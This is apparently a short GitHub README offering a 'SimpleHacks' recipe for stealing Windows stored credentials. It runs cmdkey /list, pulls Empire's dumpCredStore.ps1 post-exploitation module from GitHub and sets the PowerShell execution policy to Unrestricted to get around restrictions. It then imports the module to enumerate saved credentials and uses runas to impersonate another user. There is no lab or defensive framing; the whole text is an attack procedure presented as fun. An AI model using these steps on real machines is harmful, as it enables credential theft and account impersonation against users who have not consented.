# waszup
AsmWebScan

This simple bypass of Windows creds inspired me to start building next-level "SimpleHacks"

You already know your way to the command prompt in Windows...

At the command prompt run this command:

cmdkey /list

Next, pull a copy of good old Empire's dumpCredStore.ps1

https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1

Dont waste time and free yourself of any restrictions:

powershell Set-ExecutionPolicy -Scope CurrentUser Unrestricted

Now, run this command at the prompt:

powershell Import-module <Path to dumpCredStore.ps1> ; Enum-Creds

And, have fun with runas - which is used to run tools or commands with "different privileges" aka impersonating another users

runas /user:shalom cmd.exe

